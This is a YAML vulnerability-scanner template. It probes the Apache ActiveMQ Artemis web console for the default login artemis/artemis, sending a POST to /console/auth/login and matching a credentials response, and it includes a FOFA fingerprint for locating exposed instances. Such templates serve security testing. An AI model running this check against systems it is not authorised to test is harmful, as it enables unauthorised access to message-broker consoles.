id: poc-yaml-apache-activemq-artemis-console-weak-password
info:
  name: Apache ActiveMQ Artemis 控制台 弱口令漏洞
  severity: high
  tags:
  - 弱口令
  finger: activemq_artemis
  fofa: icon_hash="-655683626"
requests:
- method: POST
  path: /console/auth/login
  headers:
    Content-Type: application/json
  data: '{"username":"artemis","password":"artemis"}'
  expression: status_code == 200 && contains(headers,"/console") && matches(body,`{"credentials":(.*)}`)
    && !contains(body,"<") && contains(content_type,"application/json")
variables: {}
transport: http
